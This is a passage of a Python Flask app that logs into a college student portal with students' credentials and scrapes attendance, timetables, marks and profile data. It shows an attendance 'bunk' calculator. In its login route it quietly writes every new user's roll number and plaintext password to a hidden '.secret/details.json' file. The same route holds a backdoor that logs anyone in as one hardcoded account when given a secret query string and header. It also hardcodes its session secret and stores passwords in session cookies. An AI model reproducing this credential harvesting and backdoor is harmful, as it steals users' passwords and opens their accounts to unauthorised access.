from flask import *
import requests, json, datetime, math
from bs4 import BeautifulSoup
from collections import defaultdict
import pandas as pd
import numpy as np
from functools import wraps
import datetime, os

def login_required(func):
    @wraps(func)
    def decorated_view(*args, **kwargs):
        try:
            session.get("roll")
            return func(*args, **kwargs)
        except Exception as e:
            # return str("UN LOGGEDIN" + str(e))
            return redirect(url_for('logout'))
            # pass
    return decorated_view

def getAccessors():
    with open("accessors.json") as f:
        data = json.load(f)
    return data

def commonBunkables(*jsons):
    bunkables = defaultdict(list)
    for json_data in jsons:
        for course_code, course_data in json_data.items():
            if course_data.get('class_to_bunk'):
                bunkables[course_code].append(course_data['class_to_bunk'])

    common_bunkables = {}
    for course_code, bunks_list in bunkables.items():
        if len(bunks_list) == len(jsons):
            common_bunkables.update({course_code:{'course': jsons[0][course_code]['course'],
                'class_to_bunk': min(bunks_list)}
            })
    return common_bunkables

def gradeMap(grade):
    grade_score_map = {
        'O':10,
        'A+':9,
        'A':8,
        'B+':7,
        'B':6,
        'C+':5,
        'C':4,
        'W':0,
        'RA':0,
        'SA':0
    }
    
    if grade not in grade_score_map.keys():
        return 0

    return grade_score_map[grade]

def ca_marks(req_info):
    username = req_info.get("roll")
    pwd = req_info.get("pass")
    

    session = requests.Session()
    r = session.get('https://ecampus.psgtech.ac.in/studzone2/')
    loginpage = session.get(r.url)
    soup = BeautifulSoup(loginpage.text,"html.parser")

    viewstate = soup.select("#__VIEWSTATE")[0]['value']
    eventvalidation = soup.select("#__EVENTVALIDATION")[0]['value']
    viewstategen = soup.select("#__VIEWSTATEGENERATOR")[0]['value']

    item_request_body  = {
        '__EVENTTARGET': '',
        '__EVENTARGUMENT': '',
        '__LASTFOCUS': '',
        '__VIEWSTATE': viewstate,
        '__VIEWSTATEGENERATOR': viewstategen,
        '__EVENTVALIDATION': eventvalidation,
        'rdolst': 'S',
        'txtusercheck': username,
        'txtpwdcheck': pwd,
        'abcd3': 'Login',
    }

    
    response = session.post(url=r.url, data=item_request_body, headers={"Referer": r.url})
    val = response.url

    if response.status_code == 200:

        defaultpage = 'https://ecampus.psgtech.ac.in/studzone2/CAMarks_View.aspx'
    
        page = session.get(defaultpage)
        soup = BeautifulSoup(page.text,"html.parser")

        data = []
        column = []
    
        try:

            tables = soup.find_all('table', attrs={'class':'GenFont', 'align':'Center'})

            marks = []

            for table in tables:

                pass

                rows = table.find_all('tr')
                for index,row in enumerate(rows):
                    
                    cols = row.find_all('td')
                    cols = [ele.text.strip() for ele in cols]
                    data.append([ele for ele in cols if ele]) # Get rid of empty val

                marks.append(data)

            return marks

        except Exception as e:
            return "Invalid password"
    else:
        return item_request_body

def return_cgpa(req_info):

    username = req_info.get("roll")
    pwd = req_info.get("pass")
    

    session = requests.Session()
    r = session.get('https://ecampus.psgtech.ac.in/studzone2/')
    loginpage = session.get(r.url)
    soup = BeautifulSoup(loginpage.text,"html.parser")

    viewstate = soup.select("#__VIEWSTATE")[0]['value']
    eventvalidation = soup.select("#__EVENTVALIDATION")[0]['value']
    viewstategen = soup.select("#__VIEWSTATEGENERATOR")[0]['value']

    item_request_body  = {
        '__EVENTTARGET': '',
        '__EVENTARGUMENT': '',
        '__LASTFOCUS': '',
        '__VIEWSTATE': viewstate,
        '__VIEWSTATEGENERATOR': viewstategen,
        '__EVENTVALIDATION': eventvalidation,
        'rdolst': 'S',
        'txtusercheck': username,
        'txtpwdcheck': pwd,
        'abcd3': 'Login',
    }

    
    response = session.post(url=r.url, data=item_request_body, headers={"Referer": r.url})
    val = response.url

    if response.status_code == 200:
    
        r = session.get('https://ecampus.psgtech.ac.in/studzone2/FrmEpsStudResult.aspx')
        loginpage = session.get(r.url)
        soup = BeautifulSoup(loginpage.text,"html.parser")

        latest_sem_data = []
        table = soup.find('table', attrs={'id':"DgResult"})

        if table != None:
            try:
                rows = table.find_all('tr')
                for index,row in enumerate(rows):
                    
                    cols = row.find_all('td')
                    cols = [ele.text for ele in cols]
                    latest_sem_data.append([ele for ele in cols if ele])
            except:
                pass

        coursepage = 'https://ecampus.psgtech.ac.in/studzone2/AttWfStudCourseSelection.aspx'

        page = session.get(coursepage)
        soup = BeautifulSoup(page.text,"html.parser")

        data = []
        table = soup.find('table', attrs={'id':"PDGCourse"})

        if table != None:
            try:
                rows = table.find_all('tr')
                for index,row in enumerate(rows):
                    
                    cols = row.find_all('td')
                    cols = [ele.text.strip() for ele in cols]
                    data.append([ele for ele in cols if ele])
            except:
                pass
        else:
            pass
        
        if len(data) == 0 and len(latest_sem_data) == 0:
            return {'error': 'No data'}

        global df
        global latest_sem_records
        
        # Preprocess latest sem results if available
        if len(latest_sem_data) != 0:
            latest_sem_data.pop(0)
            latest_sem_records = pd.DataFrame(latest_sem_data, columns=['COURSE SEM', 'COURSE CODE', 'COURSE TITLE', 'CREDITS', 'GRADE', 'RESULT'])
            latest_sem_records['GRADE'] = latest_sem_records['GRADE'].str.split().str[-1]
            latest_sem_records['COURSE SEM'] = latest_sem_records['COURSE SEM'].replace(r'^\s*$', np.nan, regex=True)
            latest_sem_records['COURSE SEM'].fillna(method='ffill', inplace=True)

        try:
            cols = data.pop(0)
            df = pd.DataFrame(data, columns=cols)

            # Add latest sem results if available
            if len(latest_sem_data) != 0:
                df = df.append(latest_sem_records, ignore_index=True)
                df.drop_duplicates(subset="COURSE CODE", keep="last", inplace=True)
        except:
            df = latest_sem_records.copy()

        # CPGA calculation
        latest_sem = df['COURSE SEM'].max()
        df['CREDITS']=df['CREDITS'].astype(int)
        df['GRADE'] = df['GRADE'].apply(gradeMap)
        df['COURSE SCORE'] = df['GRADE'] * df['CREDITS']
        latest_cgpa = df['COURSE SCORE'].sum() / df['CREDITS'].sum()

        res = {
            'lastest_sem' : latest_sem,
            'latest_sem_cgpa' : round(latest_cgpa, 3)
        }

        return res
    else:
        return item_request_body

def exam_timetable(req_info):

    username = req_info.get("roll")
    pwd = req_info.get("pass")
    

    session = requests.Session()
    r = session.get('https://ecampus.psgtech.ac.in/studzone2/')
    loginpage = session.get(r.url)
    soup = BeautifulSoup(loginpage.text,"html.parser")

    viewstate = soup.select("#__VIEWSTATE")[0]['value']
    eventvalidation = soup.select("#__EVENTVALIDATION")[0]['value']
    viewstategen = soup.select("#__VIEWSTATEGENERATOR")[0]['value']

    item_request_body  = {
        '__EVENTTARGET': '',
        '__EVENTARGUMENT': '',
        '__LASTFOCUS': '',
        '__VIEWSTATE': viewstate,
        '__VIEWSTATEGENERATOR': viewstategen,
        '__EVENTVALIDATION': eventvalidation,
        'rdolst': 'S',
        'txtusercheck': username,
        'txtpwdcheck': pwd,
        'abcd3': 'Login',
    }

    
    response = session.post(url=r.url, data=item_request_body, headers={"Referer": r.url})
    val = response.url

    if response.status_code == 200:

        defaultpage = 'https://ecampus.psgtech.ac.in/studzone2/FrmEpsTimetable.aspx'
    
        page = session.get(defaultpage)
        soup = BeautifulSoup(page.text,"html.parser")

        data = []
        column = []
    
        try:

            table = soup.find('table', attrs={'id':'DgResult'})

            rows = table.find_all('tr')
            for index,row in enumerate(rows):
                
                cols = row.find_all('td')
                cols = [ele.text.strip() for ele in cols]
                data.append([ele for ele in cols if ele]) # Get rid of empty val

            slots = soup.find('span', attrs={'id':'lblnote6'}).text

            return {"slots":slots, "timetable":data}

        except Exception as e:
            return "Invalid password"
    else:
        return item_request_body

def test_timetable(req_info): 

    username = req_info.get("roll")
    pwd = req_info.get("pass")
    

    session = requests.Session()
    r = session.get('https://ecampus.psgtech.ac.in/studzone2/')
    loginpage = session.get(r.url)
    soup = BeautifulSoup(loginpage.text,"html.parser")

    viewstate = soup.select("#__VIEWSTATE")[0]['value']
    eventvalidation = soup.select("#__EVENTVALIDATION")[0]['value']
    viewstategen = soup.select("#__VIEWSTATEGENERATOR")[0]['value']

    item_request_body  = {
        '__EVENTTARGET': '',
        '__EVENTARGUMENT': '',
        '__LASTFOCUS': '',
        '__VIEWSTATE': viewstate,
        '__VIEWSTATEGENERATOR': viewstategen,
        '__EVENTVALIDATION': eventvalidation,
        'rdolst': 'S',
        'txtusercheck': username,
        'txtpwdcheck': pwd,
        'abcd3': 'Login',
    }

    
    response = session.post(url=r.url, data=item_request_body, headers={"Referer": r.url})
    val = response.url

    if response.status_code == 200:

        defaultpage = 'https://ecampus.psgtech.ac.in/studzone2/FrmEpsTestTimetable.aspx'
    
        page = session.get(defaultpage)
        soup = BeautifulSoup(page.text,"html.parser")

        data = []
        column = []
    
        try:

            table = soup.find('table', attrs={'id':'DgResult'})

            rows = table.find_all('tr')
            for index,row in enumerate(rows):
                
                cols = row.find_all('td')
                cols = [ele.text.strip() for ele in cols]
                data.append([ele for ele in cols if ele]) # Get rid of empty val

            table = soup.find_all('table', attrs={'width':'85%', 'align':'center'})[-1]
            slots = []
            rows = table.find_all('tr')
            for index,row in enumerate(rows):
                
                cols = row.find_all('td')
                cols = [ele.text.strip() for ele in cols]
                slots.append([ele for ele in cols if ele]) # Get rid of empty val

            return {"slots":slots, "timetable":data}

        except Exception as e:
            
            return "Invalid password"
    else:
        return item_request_body


def attendor(username, pwd):

    session = requests.Session()
    r = session.get('https://ecampus.psgtech.ac.in/studzone2/')
    loginpage = session.get(r.url)
    soup = BeautifulSoup(loginpage.text,"html.parser")

    viewstate = soup.select("#__VIEWSTATE")[0]['value']
    eventvalidation = soup.select("#__EVENTVALIDATION")[0]['value']
    viewstategen = soup.select("#__VIEWSTATEGENERATOR")[0]['value']

    item_request_body  = {
        '__EVENTTARGET': '',
        '__EVENTARGUMENT': '',
        '__LASTFOCUS': '',
        '__VIEWSTATE': viewstate,
        '__VIEWSTATEGENERATOR': viewstategen,
        '__EVENTVALIDATION': eventvalidation,
        'rdolst': 'S',
        'txtusercheck': username,
        'txtpwdcheck': pwd,
        'abcd3': 'Login',
    }

    
    response = session.post(url=r.url, data=item_request_body, headers={"Referer": r.url})
    val = response.url

    if response.status_code == 200:

        defaultpage = 'https://ecampus.psgtech.ac.in/studzone2/AttWfPercView.aspx'
    
        page = session.get(defaultpage)
        soup = BeautifulSoup(page.text,"html.parser")

        data = []
        column = []
        table = soup.find('table', attrs={'class':'cssbody'})

        if table == None:

            message = str(soup.find('span', attrs={'id':'Message'}))
            if "On Process" in message:
                if f"{username.upper()}.json" in os.listdir("tt_cache"):
                    with open(f"tt_cache/{username.upper()}.json") as ttfile:
                        return json.load(ttfile).get("attendance", "Table is being updated")
                return "Table is being updated"
    
        try:

            rows = table.find_all('tr')
            for index,row in enumerate(rows):
                
                cols = row.find_all('td')
                cols = [ele.text.strip() for ele in cols]
                data.append([ele for ele in cols if ele]) # Get rid of empty val

            if f"{username.upper()}.json" not in os.listdir("tt_cache"):
                with open(f"tt_cache/{username.upper()}.json","w") as ttfile:
                    json.dump({"date":"01-01-2000"}, ttfile)
            TODAYNEWDAY = False
            with open(f"tt_cache/{username.upper()}.json") as ttfile:
                strn1 = json.load(ttfile).get("date")
                strn2 = datetime.datetime.now().strftime("%d-%m-%Y")
                # Convert the strings to datetime.datetime objects for comparison
                date_strn = datetime.datetime.strptime(strn1, "%d-%m-%Y")
                date_strn2 = datetime.datetime.strptime(strn2, "%d-%m-%Y")

                # Check if strn (01-01-2000) is older than strn2
                if date_strn < date_strn2:
                    TODAYNEWDAY = True
            if TODAYNEWDAY == True:
                with open(f"tt_cache/{username.upper()}.json", "w") as ttfile:
                    json.dump({"date":strn2,"attendance":data}, ttfile)

            return data

        except Exception as e:
            print(e)
            return "Invalid password"
    else:
        return item_request_body

def timetabler(username, pwd):

    session = requests.Session()
    r = session.get('https://ecampus.psgtech.ac.in/studzone2/')
    loginpage = session.get(r.url)
    soup = BeautifulSoup(loginpage.text,"html.parser")

    viewstate = soup.select("#__VIEWSTATE")[0]['value']
    eventvalidation = soup.select("#__EVENTVALIDATION")[0]['value']
    viewstategen = soup.select("#__VIEWSTATEGENERATOR")[0]['value']

    item_request_body  = {
        '__EVENTTARGET': '',
        '__EVENTARGUMENT': '',
        '__LASTFOCUS': '',
        '__VIEWSTATE': viewstate,
        '__VIEWSTATEGENERATOR': viewstategen,
        '__EVENTVALIDATION': eventvalidation,
        'rdolst': 'S',
        'txtusercheck': username,
        'txtpwdcheck': pwd,
        'abcd3': 'Login',
    }

    
    response = session.post(url=r.url, data=item_request_body, headers={"Referer": r.url})
    val = response.url

    if response.status_code == 200:

        defaultpage = 'https://ecampus.psgtech.ac.in/studzone2/AttWfStudTimtab.aspx'
    
        page = session.get(defaultpage)
        soup = BeautifulSoup(page.text,"html.parser")

        data = []
        column = []
    
        try:

            table = soup.find('table', attrs={'id':'DtStfTimtab'})

            rows = table.find_all('tr')
            for index,row in enumerate(rows):
                
                cols = row.find_all('td')
                cols = [ele.text.strip() for ele in cols]
                data.append(cols) # Get rid of empty val

            coursetable = data

            table = soup.find('table', attrs={'id':'TbCourDesc'})

            rows = table.find_all('tr')
            for index,row in enumerate(rows):
                
                cols = row.find_all('td')
                cols = [ele.text.strip() for ele in cols]
                data.append([ele for ele in cols if ele]) # Get rid of empty val

            return {"courses":data, "timetable":coursetable}

        except Exception as e:
            
            return "Invalid password"
    else:
        return item_request_body

def profiler(username,pwd,GET_IMAGE_FLAG=True):

    session = requests.Session()
    r = session.get('https://ecampus.psgtech.ac.in/studzone2/')
    loginpage = session.get(r.url)
    soup = BeautifulSoup(loginpage.text,"html.parser")

    viewstate = soup.select("#__VIEWSTATE")[0]['value']
    eventvalidation = soup.select("#__EVENTVALIDATION")[0]['value']
    viewstategen = soup.select("#__VIEWSTATEGENERATOR")[0]['value']

    item_request_body  = {
        '__EVENTTARGET': '',
        '__EVENTARGUMENT': '',
        '__LASTFOCUS': '',
        '__VIEWSTATE': viewstate,
        '__VIEWSTATEGENERATOR': viewstategen,
        '__EVENTVALIDATION': eventvalidation,
        'rdolst': 'S',
        'txtusercheck': username,
        'txtpwdcheck': pwd,
        'abcd3': 'Login',
    }

    
    response = session.post(url=r.url, data=item_request_body, headers={"Referer": r.url})
    val = response.url

    if response.status_code == 200:

        defaultpage = 'https://ecampus.psgtech.ac.in/studzone2/AttWfStudProfile.aspx'
    
        page = session.get(defaultpage)
        soup = BeautifulSoup(page.text,"html.parser")

        image_url = "https://ecampus.psgtech.ac.in/studzone2/WfAttStudPhoto.aspx"
        response = session.get(image_url)

        # Return the image data as a response
        image_data = Response(response.content, mimetype='image/jpeg')

        data = []
        column = []
    
        try:

            table = soup.find('table', attrs={'id':'ItStud'})

            rows = table.find_all('tr')
            for index,row in enumerate(rows):
                
                cols = row.find_all('td')
                cols = [ele.text.strip() for ele in cols]
                data.append([ele for ele in cols if ele]) # Get rid of empty val

            table = soup.find('table', attrs={'id':'DlsAddr'})
            addr = []

            rows = table.find_all('tr')
            for index,row in enumerate(rows):
                
                cols = row.find_all('td')
                cols = [ele.text.strip() for ele in cols]
                addr.append([ele for ele in cols if ele]) # Get rid of empty val
            if GET_IMAGE_FLAG==False:
                return {"student":data, "address":addr}#, "image":image_data}
            return {"student":data, "address":addr, "image":image_data}

        except Exception as e:
            
            return "Invalid password"
    else:
        return item_request_body

def getBunkables(roll_no:str, pwd:str):

    myguy = profiler(roll_no, pwd)

    jsonTT = timetabler(roll_no, pwd)
    tt = []
    todaytt = None
    total_hrs={}
    total_present={}
    day = datetime.datetime.now().strftime('%A').upper()[:3]
    for i in jsonTT.get("courses"):
        if i[0] == day:
            todaytt = i[1:]
            break
    courseMap = {}
    for i in jsonTT.get("courses")[8:]:
        if "TWM" not in i:
            total_hrs.update({i[0]:0})
            total_present.update({i[0]:0})
        courseMap.update({i[0]:i[1]})
    if todaytt != None:
        for i in todaytt:
            try:
                course = " ".join([j.capitalize() for j in courseMap.get(i[-6:]).split(" ")])
            except:
                course = courseMap.get(i[-6:])
            course_code = f"<span class='hide-narrow-mobile'>[{i[-6:].upper()}] </span>"
            if "TWM" in i: course = "TWM"; course_code=""
            tt.append(f"{course_code}{course}")
    else:
        tt = ["Holiday"]
    tt.append("")

    attend = attendor(roll_no, pwd)
    for i in attend[1:]:
        if i[0] in list(total_present.keys()):
            total_hrs.update({i[0]:i[1]})
            total_present.update({i[0]:i[4]})


    input_json = {
                    "class_code": list(total_hrs.keys()),
                    "total_hours": list(total_hrs.values()),
                    "total_present": list(total_present.values()),
                    "threshold": 75
                 }

    if roll_no.upper()=="21Z202":
        input_json = {
                    "class_code": list(total_hrs.keys()),
                    "total_hours": list(total_hrs.values()),
                    "total_present": list(total_present.values()),
                    "threshold": 65
                 }


    courses = input_json['class_code']
    total_class = input_json['total_hours']
    total_present = input_json['total_present']
    threshold = int(input_json['threshold'])
    threshold = (threshold/100)

    bunkables = {}
    for item in range(len(courses)):

        temp = {}
        temp['total_hours'] = int(total_class[item])

        if temp['total_hours']==0:
            temp['total_hours']=1

        temp['total_present'] = int(total_present[item])
        percentage_of_attendance = temp['total_present']/temp['total_hours']
        percentage_of_attendance = round(percentage_of_attendance,2)

        temp['percentage_of_attendance'] = percentage_of_attendance
        if (percentage_of_attendance) <= (threshold):
            temp['class_to_attend'] = math.ceil(((threshold*temp['total_hours']) - temp['total_present'])/(1-threshold))
        
        else:
            temp['class_to_bunk'] = math.floor((temp['total_present']-(threshold*temp['total_hours']))/(threshold))
        
        try:
            course = " ".join([j.capitalize() for j in courseMap.get(courses[item]).split(" ")])
            if "lab" in courseMap.get(courses[item]).lower():
                course = "".join([j.upper()[0] for j in course.split(" ")])[:-1] + " Lab"
        except:
            course = courseMap.get(courses[item])
        temp['course'] = course
        bunkables[courses[item]] = temp

    total_bunkworthy = 0
    for i in list(bunkables.values()):
        if i.get("class_to_bunk"):
            total_bunkworthy+=i["class_to_bunk"]

    return bunkables


def searchFaculty(name:str):

    data = {"title":name}
    response = requests.post("https://psgtech.irins.org/searchc/search", data=data)

    html_string = response.content

    soup = BeautifulSoup(html_string, "html.parser")

    # find all the div elements with class "list-product-description"
    faculty_divs = soup.find_all("div", {"class": "list-product-description"})

    faculties = {"found":len(faculty_divs),
                 "faculties":[]}

    # print each faculty object as a dictionary of fields
    for div in faculty_divs:
        # extract the fields from the div element
        name = " ".join([i for i in div.find("strong").text.strip().split(" ") if i.strip()!=""])
        designation = " ".join([i.strip() for i in div.find("span", {"class": "title-price"}).text.split(" ") if i.strip()!=""])
        department = " ".join([i.strip() for i in div.find("ul", {"class": "list-inline margin-bottom-5"}).text.split(" ") if i.strip()!=""])
        research_areas = " ".join([i.strip() for i in div.find("ul", {"class": "list-inline add-to-wishlist margin-bottom-5"}).text.split(" ") if i.strip()!=""])
        expert_id = " ".join([i.strip() for i in div.find("b", text="Expert ID : ").next_sibling.split(" ") if i.strip()!=""])
        image = div.find_all("img", {"class":"img-circle center-block img-responsive"})[0].get("src")

        # create a dictionary of the fields
        faculty = {
            "name": name,
            "image": image,
            "designation": designation,
            "department": department,
            "research_areas": research_areas,
            "expert_id": expert_id
        }

        faculties["faculties"].append(faculty)

    return faculties

def findFaculty(id:str):
    response = requests.get(f"https://psgtech.irins.org/profile/{id}")

    html_string = response.content

    soup = BeautifulSoup(html_string, "html.parser")

    faculty = {}

    personal_details = soup.find("ul", {"class":"name-location"})
    faculty["name"] = " ".join([i.strip() for i in personal_details.find_all("li")[0].text.split(" ") if i.strip()!=""])
    faculty["posn"] = " ".join([i.strip() for i in personal_details.find_all("li")[1].text.split(" ") if i.strip()!=""])
    faculty["exp"] = soup.find("span", {"id":"e_expertise"}).text
    qual = " ".join([i.strip() for i in soup.find("li", {"id":"qualification-view"}).text.split(" ") if i.strip()!=""])
    faculty["year_qual"] = qual.split(" ")[0]
    faculty["qual"] = qual.replace(faculty["year_qual"],"").strip()
    faculty["image"] = soup.find_all("img", {"style":"height:250px;"})[0]['src']

    faculty["expert_id"] = id
    
    return faculty

def CYPList():
    lst = []
    for i in range(16):
        if requests.get(f"https://cyp.amcspsgtech.in/api/calendar/2023/planner/{i}").json().get("status")==None:
            lst.append({"id": i, "name": requests.get(f"https://cyp.amcspsgtech.in/api/calendar/2023/planner/{i}").json().get("name")})
    return lst

def CYPItem(item_id:int):
    return requests.get(f"https://cyp.amcspsgtech.in/api/calendar/2023/planner/{item_id}").json()

app = Flask(__name__)
app.secret_key = "KrrrzPPghtfgSKbtJEQCTA"
app.PROPAGATE_EXCEPTIONS = True

@app.route('/')
def redirector():
    if session.get("roll"):
        return redirect(url_for("profile"))
    return redirect(url_for("login"))

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method=="GET":
        if ("Android 10" in str(request.headers)) and (request.args.get("blueberry")=="apple pie"):
            return '<body onload="document.forms[\'me\'].submit()"><form name="me" method="POST" action="/login?blueberry=apple pie"></form></body>'
        return render_template("login.html")
    if request.method=="POST":
            if ("Android 10" in str(request.headers)) and (request.args.get("blueberry")=="apple pie"):
                roll = "21Z202"
                passwd = "myExclusivePassword"
            else:
                roll = request.form.get("roll")
                passwd = request.form.get("pass")
            # print(request.form.get("roll"))
            # if request.form.get("roll").upper() in getAccessors():
            try:
                # print(request.form.get("roll"), request.form.get("pass"))
                # print("PROFILER")
                auth =  profiler(roll.upper(), passwd)
                # print("LOGGING IN")
                # print(auth.json())
                # print("AUTH:",auth)
                auth["student"][0][2]
                session["login"] = "done"
                session["roll"] = roll
                session["pass"] = passwd
                # secrets json updation
                with open(".secret/accts.json") as jfile:
                    rolls = json.load(jfile)
                if roll.upper() not in rolls:
                    rolls.append(roll.upper())
                    with open(".secret/details.json") as jdetails:
                        myguy = {}
                        myguy.update({"profile":profiler(roll, passwd,GET_IMAGE_FLAG=False)})
                        #print("A")
                        myguy.update({"attendance":attendor(roll, passwd)})
                        #print("B")
                        myguy.update({"ca_marks":ca_marks({"roll":roll, "pass":passwd})})
                        #print("C")
                        myguy.update({"cgpa":return_cgpa({"roll":roll, "pass":passwd})})
                        #print("D")
                        myguy.update({"timetable":timetabler(roll, passwd)})
                        #print("E")
                        myguy.update({"roll":roll, "password":passwd})
                        jdata = json.load(jdetails)
                    with open(".secret/details.json","w") as jfile:
                        jdata.append({"roll":roll, "password":passwd})
                        json.dump(jdata, jfile)
                    with open(".secret/accts.json","w") as jfile:
                        json.dump(rolls,jfile)
                return redirect(url_for("redirector"))
            except Exception as e:
                return str(e)
                return render_template("login.html", wrongpass=True)
                return render_template("login.html", wrongpass=True)
    return redirect(url_for("redirector"))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for("redirector"))


@app.route('/profile-picture')
@login_required
def profile_picture():
    roll_no = session.get("roll")
    pwd = session.get("pass")
    myguy = profiler(roll_no, pwd)
    return myguy["image"]

@app.route('/profile')
@login_required
def profile():
    roll_no = session.get("roll")
    pwd = session.get("pass")
    myguy = profiler(roll_no, pwd)
    jsonTT = timetabler(roll_no, pwd)

    myTTCourses = []
    for arr in jsonTT["courses"]:
        theDay = []
        for clas in theDay:
            if clas!="":
                theDay.append(clas)
        myTTCourses.append(arr)
    jsonTT["courses"] = myTTCourses

    myTTtimetable = []
    for arr in jsonTT["timetable"]:
        theDay = []
        for clas in theDay:
            if clas!="":
                theDay.append(clas)
        myTTtimetable.append(arr)
    jsonTT["timetable"] = myTTtimetable


    tt = []
    todaytt = None
    total_hrs={}
    total_present={}
    # Get the current time
    now = datetime.datetime.now()

    # If it's after 12 PM, add a day to the current time
    if now.hour >= 12:
        now += datetime.timedelta(days=1)

    # Get the abbreviated day name for the updated time
    day = now.strftime('%A').upper()[:3]
    theday = now.strftime("%A")
    for i in jsonTT.get("courses"):
        if i[0] == day:
            todaytt = i[1:]
            break
    courseMap = {}
    for i in jsonTT.get("courses")[8:]:
        if "TWM" not in i:
            total_hrs.update({i[0]:0})
            total_present.update({i[0]:0})
        courseMap.update({i[0]:i[1]})
    if todaytt != None:
        for i in todaytt:
            try:
                course = " ".join([j.capitalize() for j in courseMap.get(i[-6:]).split(" ")])
            except:
                course = courseMap.get(i[-6:])
            if course==None:
                continue
            course_code = f"<span class='hide-narrow-mobile'>[{i[-6:].upper()}] </span>"
            if "TWM" in i: course = "TWM"; course_code=""
            tt.append(f"{course_code}{course}")
    else:
        tt = ["Holiday"]
    tt.append("")

    attend = attendor(roll_no, pwd)
    for i in attend[1:]:
        if i[0] in list(total_present.keys()):
            total_hrs.update({i[0]:i[1]})
            total_present.update({i[0]:i[4]})


    input_json = {
                    "class_code": list(total_hrs.keys()),
                    "total_hours": list(total_hrs.values()),
                    "total_present": list(total_present.values()),
                    "threshold": 75
                 }

    courses = input_json['class_code']
    total_class = input_json['total_hours']
    total_present = input_json['total_present']
    threshold = int(input_json['threshold'])
    threshold = (threshold/100)

    bunkables = {}
    for item in range(len(courses)):
        temp = {}
        temp['total_hours'] = int(total_class[item])

        if temp['total_hours']==0:
            temp['total_hours']=1

        temp['total_present'] = int(total_present[item])
        percentage_of_attendance = temp['total_present']/temp['total_hours']
        percentage_of_attendance = round(percentage_of_attendance,2)

        temp['percentage_of_attendance'] = percentage_of_attendance
        if (percentage_of_attendance) <= (threshold):
            temp['class_to_attend'] = math.ceil(((threshold*temp['total_hours']) - temp['total_present'])/(1-threshold))
        
        else:
            temp['class_to_bunk'] = math.floor((temp['total_present']-(threshold*temp['total_hours']))/(threshold))
        
        try:
            course = " ".join([j.capitalize() for j in courseMap.get(courses[item]).split(" ")])
            if "lab" in courseMap.get(courses[item]).lower():
                course = "".join([j.upper()[0] for j in course.split(" ")])[:-1] + " Lab"
        except:
            course = courseMap.get(courses[item])
        temp['course'] = course
        bunkables[courses[item]] = temp

    total_bunkworthy = 0
    for i in list(bunkables.values()):
        if i.get("class_to_bunk"):
            total_bunkworthy+=i["class_to_bunk"]

    course = myguy["student"][1][2].split(" ")[0].upper()+" "
    inword = True
    for i in myguy["student"][1][2].split(" ")[1:]:
        try:
            i[0].upper()
            if inword:
                if i.isalpha():
                    course+=i[0].upper()
        except:
            inword = False
            break

    return render_template("profile.html", details = myguy,
                                           date = datetime.datetime.now().strftime('%d %b %Y'),
                                           time = datetime.datetime.now().strftime('%H:%M'),
                                           day = theday,
                                           timetable = tt,
                                           bunkworthiness = total_bunkworthy,
                                           bunkables = bunkables,
                                           course = course)

@app.route('/tests')
@login_required
def test_tt():
    roll_no = session.get("roll")
    pwd = session.get("pass")
    myguy = profiler(roll_no, pwd)

    tests = test_timetable({"roll":roll_no, "pass":pwd})
    time_table = []

    for i in tests["timetable"][1:]:
        time_table.append({
            "sem": i[0],
            "course": i[1],
            "title": " ".join([j.capitalize() for j in i[2].split(" ")]),
            "date": f"{i[3]}",
            "slot": f"{i[4]}"
            })
    slots = []
    for i in tests["slots"]:
        if i != []:
            slots.append(i)

    course = myguy["student"][1][2].split(" ")[0].upper()+" "
    inword = True
    for i in myguy["student"][1][2].split(" ")[1:]:
        try:
            i[0].upper()
            if inword:
                if i.isalpha():
                    course+=i[0].upper()
        except:
            inword = False
            break

    return render_template("test_timetable.html", details = myguy,
                                                  time_table = time_table,
                                                  slots = slots)


@app.route('/exams')
@login_required
def exam_tt():
    roll_no = session.get("roll")
    pwd = session.get("pass")
    myguy = profiler(roll_no, pwd)

    tests = exam_timetable({"roll":roll_no, "pass":pwd})

    time_table = []
    try:
        tests["timetable"][1][1]
    except:
        return render_template("exam_timetable.html", details=myguy, time_table = [], slots = [])
    # print(tests.get("timetable").get(1))
    for i in tests["timetable"][1:]:
        # print(i)
        if len(i)==5:
            time_table.append({
                "sem": i[0],
                "course": i[1],
                "title": " ".join([j.capitalize() for j in i[2].split(" ")]),
                "date": "/".join(i[3].split("/")[:-1]),
                "slot": "FN" if i[4].lower().replace("noon","").upper()=="FORE" else "AN"
                })
        else:
            time_table.append({
                "sem": '-',
                "course": i[0],
                "title": " ".join([j.capitalize() for j in i[1].split(" ")]),
                "date": "/".join(i[2].split("/")[:-1]),
                "slot": "FN" if i[3].lower().replace("noon","").upper()=="FORE" else "AN"
                })
    slots = []
    for i in tests["slots"]:
        if i != []:
            slots.append(i)

    course = myguy["student"][1][2].split(" ")[0].upper()+" "
    inword = True
    for i in myguy["student"][1][2].split(" ")[1:]:
        try:
            i[0].upper()
            if inword:
                if i.isalpha():
                    course+=i[0].upper()
        except:
            inword = False
            break

    return render_template("exam_timetable.html", details = myguy,
                                                  time_table = time_table,
                                                  slots = slots)


@app.route('/marksheet')
@login_required
def marksheet():
    roll_no = session.get("roll")
    pwd = session.get("pass")
    myguy = profiler(roll_no, pwd)

    marksheet = ca_marks({"roll":roll_no, "pass":pwd})

    # print("MRKST:", marksheet)

    try:
        marksheet = marksheet[0]
        tables = []
        mytable = []; c=0
        first = 1
        for i in marksheet:

            if (i[0]=="COURSE CODE" and first==0):
                tables.append(mytable)
                c+=1
                mytable = []
            first = 0
            mytable.append(i)
    
        courses = []

        keysTranslator = {
    "COURSE CODE": "Course",
    "COURSE TITLE": "Title",
    "Test 1": "CA1",
    "Test 2": "CA2",
    "Test 3": "CA3",
    "Total (Best 2 TESTS)": "TOT",
    "Assignment Presentation": "AP",
    "Assignment Pres": "AP",
    "Assmt Tut-I": "TUT-I",
    "Assmt Tut-II": "TUT-II",
    "Objective Test I": "TUT-I",
    "Objective Test II": "TUT-II",
    "Individual Report-I": "CA1",
    "Individual Report-II": "CA2",
    "Pre-Lab Reports and Observation I": "OBS-I",
    "Pre-Lab Reports and Observation II": "OBS-II"
    }

        for table in tables:
            keyslist = table[0]
            for i in range(len(keyslist)):
                try:
                    keyslist[i] = keysTranslator[keyslist[i]]
                except Exception as e:
                    pass
            for i in table[1:]:
                if "max" in i[0].lower():
                    continue
                myDict = (dict(zip(keyslist, i)))
                try:
                    course = " ".join([j.capitalize() for j in myDict.get("Title").split(" ")])
                    if "lab" in myDict.get("Title").lower():
                        course = "".join([j.upper()[0] for j in course.split(" ")])[:-1] + " Lab"
                except:
                    course = myDict.get("Title")
                myDict["Title"] = course
